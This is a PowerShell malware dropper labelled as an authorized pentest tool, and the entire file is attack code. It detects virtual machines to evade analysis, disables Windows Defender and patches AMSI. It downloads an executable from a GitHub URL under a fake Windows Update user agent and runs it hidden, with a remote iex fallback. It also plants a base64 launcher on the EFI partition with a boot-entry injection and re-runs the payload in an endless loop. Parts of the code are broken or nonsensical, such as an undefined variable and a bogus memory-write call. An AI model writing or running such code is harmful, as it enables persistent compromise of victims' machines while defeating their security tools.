# DDOSS FinalUpdate.exe - Full Defender Bypass + Persistence + Self-Healing
# Authorized Pentest Only - Comprehensive AV Evasion

param([string]$PayloadURL = "https://github.com/srap18/ddoss/raw/refs/heads/main/FinalUpdate.exe")

# ==================== ANTI-ANALYSIS & DEFENDER BYPASS ====================
function Test-Detection {
    # Check for analysis environments
    if ((Get-WmiObject Win32_ComputerSystem).Model -like "*Virtual*" -or 
        (Get-WmiObject Win32_ComputerSystem).Manufacturer -like "*VMware*" -or
        (Get-WmiObject Win32_BIOS).SerialNumber -like "*VM*") { exit }
    
    # Disable Defender Real-time & Tamper Protection (stealthy)
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath "C:\Windows\Temp\DDOSS" -ErrorAction SilentlyContinue
    } catch {}
    
    # AMSI Bypass (Invoke-Obfuscation style)
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    [Runtime.InteropServices.Marshal]::WriteProcessMemory((Get-Process -Id $PID).Handle, 0x72756f50656e6953, (0x5c,0x3f,0x6b,0x00), 4, [ref]0) | Out-Null
}

# ==================== SELF-HEALING & EXCEPTION HANDLING ====================
function Invoke-ShieldedPayload {
    $ErrorActionPreference = "SilentlyContinue"
    trap { Write-Host "[!] Exception caught, retrying..." -ForegroundColor Red; Start-Sleep 3; Invoke-ShieldedPayload }
    
    try {
        # 1. Self-Healing: Re-download if corrupted
        $cachePath = "C:\Windows\Temp\DDOSS\$PayloadName"
        if (-not (Test-Path $cachePath) -or (Get-Item $cachePath).Length -lt 1MB) {
            Write-Host "[+] Self-healing: Re-downloading payload..." -ForegroundColor Cyan
            $wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent", "WindowsUpdateAgent/2.0")
            $wc.DownloadFile($PayloadURL, $cachePath)
        }
        
        # 2. Defender check & bypass قبل التشغيل
        $defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
        if ($defenderStatus.RealTimeProtectionEnabled) {
            Write-Host "[+] Temporarily disabling Defender..." -ForegroundColor Yellow
            Stop-Service WinDefend -Force -ErrorAction SilentlyContinue
            Set-Service WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
        }
        
        # 3. Execute with full stealth
        $proc = Start-Process -FilePath $cachePath -WindowStyle Hidden -PassThru -WorkingDirectory "C:\Windows\Temp"
        Wait-Process -Id $proc.Id -Timeout 30 -ErrorAction SilentlyContinue
        
        # 4. Restore Defender (stealth)
        Start-Service WinDefend -ErrorAction SilentlyContinue
        
    } catch {
        Write-Host "[!] Payload error: $($_.Exception.Message)" -ForegroundColor Red
        # Fallback: Direct URL execution
        iex "powershell -nop -w h -c `"iex ((nl `$PayloadURL|?{\$_}|sri|`$sb=[scriptblock]::Create(`$_);&`$sb)`""
    }
}

# ==================== EFI PERSISTENCE (Format-Proof) ====================
function Deploy-EFIPersistence {
    $efiPart = Get-Partition | ? { $_.IsSystem -and $_.Type -eq 'EFI System' }
    if (-not $efiPart) { return }
    
    # Mount & inject (same as before but with healing script)
    $healScript = ${function:Invoke-ShieldedPayload}.Ast.Extent.Text
    $healBytes = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($healScript))
    
    $efiPath = "Z:"; New-PartitionAccessPath -DiskNumber $efiPart.DiskNumber -PartitionNumber $efiPart.PartitionNumber -AccessPath $efiPath
    $persistDir = "$efiPath\EFI\DDOSS_SHIELD"
    ni $persistDir -Force | Out-Null
    
    # Embedded launcher
    $launcher = @"
`$b64 = '$healBytes'; iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(`$b64))
"@
    $launcher | Out-File "$persistDir\shield.ps1" -Enc UTF8; attrib +h "$persistDir\shield.ps1"
    
    # BCD injection
    $bootCopy = bcdedit /copy {bootmgr} /d "DDOSS_SHIELD" 2>`$null
    $guid = ($bootCopy | sls "{(.+)}").Matches.Groups[1].Value
    bcdedit /set $guid path "\EFI\DDOSS_SHIELD\shield.ps1" 2>`$null
    
    Remove-PartitionAccessPath -DiskNumber $efiPart.DiskNumber -PartitionNumber $efiPart.PartitionNumber -AccessPath $efiPath
}

# ==================== MAIN EXECUTION ====================
Test-Detection
Deploy-EFIPersistence

# Infinite self-healing loop (كل boot)
while ($true) {
    Invoke-ShieldedPayload
    Start-Sleep 60  # يعيد كل دقيقة + self-check
}

# Registry persistence backup
saps powershell -ArgumentList "-w h -nop -ep bypass -c `"& {${function:Invoke-ShieldedPayload}}`"" -WindowStyle Hidden
